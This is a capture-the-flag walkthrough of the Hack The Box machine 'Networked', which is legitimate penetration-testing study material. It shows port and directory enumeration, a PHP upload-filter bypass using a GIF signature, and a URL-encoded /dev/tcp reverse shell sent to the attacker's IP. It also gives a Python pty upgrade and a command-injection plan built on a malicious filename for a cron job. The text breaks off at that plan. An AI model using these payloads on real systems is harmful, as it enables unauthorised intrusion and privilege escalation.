---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Networked?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured:
aliases:
  - Linux
---

---
# Information / Description

![](../../0.%20Assets/Networked-1789044249469.webp)

---

# Walkthrough


# Foothold

Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap -sS -p- $T --min-rate 5000 -oG openPorts
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

With the ports in hand, I'll run a second, more detailed `nmap` scan.


```
nmap -sS -p 22,80 --min-rate 5000 -Pn -n -sVC -oN results.txt -v $T
```

This turns up an `apache webserver`, so let's see what's on it.

![](../../0.%20Assets/Networked-1789055828642.webp)

Not much there, so let's do some directory enumeration. `robots.txt` and `sitemap.xml` weren't found.

```
┌─[bl1nk㉿kali]─[~/engagements/networked]─[󰦝 10.10.15.150]─[ 10.129.129.76]
└─❯ gobuster dir -u http://$T/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt -t 50                                               󰅗 130
===============================================================
Gobuster v3.8.2
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://10.129.129.76/
[+] Method:                  GET
[+] Threads:                 50
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/DirBuster-2007_directory-list-2.3-big.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8.2
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
uploads              (Status: 301) [Size: 237] [--> http://10.129.129.76/uploads/]
backup               (Status: 301) [Size: 236] [--> http://10.129.129.76/backup/]
```

We find `backup` and `uploads`.

![](../../0.%20Assets/Networked-1789055888692.webp)

Let's get that backup file and see what is inside:

```
tar -xf backup.tar
```


![](../../0.%20Assets/Networked-1789055933685.webp)

Could these be pages gobuster missed? Let's take a look.

![](../../0.%20Assets/Networked-1789055964135.webp)

There they are.

I opened the `php` file before uploading anything, and it looks like there's a filter. There's also a required file called `lib.php`, so let's inspect that one too.

![](../../0.%20Assets/Networked-1789056000160.webp)

![](../../0.%20Assets/Networked-1789056144018.webp)

So there isn't just a filter, there's a MIME function checking the file's contents rather than only its extension. Let's confirm that by uploading a plain `php` file.

![](../../0.%20Assets/Networked-1789056259856.webp)

We can see the MIME-type check is being called, so let's dig a bit deeper.

![](../../0.%20Assets/Networked-1789056343086.webp)

Now that we know how it works, let's try to bypass it. I'll open `Burpsuite` and work it out there.

I'll add a `GIF file signature` to the start of the PHP shell, change the `content-type`, and use a simple bypass for the name.

```
GIF89a;
```

![](../../0.%20Assets/Networked-1789056563762.webp)

Let's see if this worked. First we need to find the gallery.
- Luckily I remembered to check the files in the backup.

![](../../0.%20Assets/Networked-1789056653670.webp)

Our file is there, so let's open it.

![](../../0.%20Assets/Networked-1789056708125.webp)


![](../../0.%20Assets/Networked-1789056728647.webp)

Now let's turn this `RCE` into a reverse shell.

I like using this site to generate reverse shells: [revshells.com](https://www.revshells.com/)

This is the payload I came up with, and remember to `URL encode` it.

```
%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.150%2F1337%200%3E%261
```

Now let's start a listener.

```
rlwrap nc -lvnp 1337
```

And trigger the reverse shell payload through the `RCE`.

Add this to the end of the URL:
```
?cmd=%2Fbin%2Fsh%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.10.15.150%2F1337%200%3E%261
```

![](../../0.%20Assets/Networked-1789056913937.webp)

We land as the user `Apache`.

Let's get an interactive shell with Python. This machine has `python` rather than `python3`, which you can confirm with `which python`, so we'll use the following command.

```
python -c 'import pty;pty.spawn("/bin/bash")'
```

Let's see if we can find `user.txt`.

```
bash-4.2$ cd
cd
bash: cd: HOME not set
bash-4.2$
```

It looks like we need to pivot to another user before we can read the flag.

Let's find the users on the box by inspecting `/etc/passwd`.

```
cat /etc/passwd | grep -i "/bin/bash"
root:x:0:0:root:/root:/bin/bash
guly:x:1000:1000:guly:/home/guly:/bin/bash
```

I filtered the output to show only the users with a real shell.

So we need to find a way to become the user `guly`.

![](../../0.%20Assets/Networked-1789057782710.webp)

I moved into his home directory. The flag is there but we can't read it, and there's a crontab that runs every 3 minutes along with a PHP file.

![](../../0.%20Assets/Networked-1789057866414.webp)

The PHP script is vulnerable to command execution if I can control what files land in the /var/www/html/uploads/ directory:
![](../../0.%20Assets/Networked-1789058642681.webp)

```
exec("nohup /bin/rm -f $path$value > /dev/null 2>&1 &");
```


There's no filter: it takes the input (a filename) and deletes it. So what if we slip in some command injection like this?

```
'fake_file; reverse shell' -> file name 
```


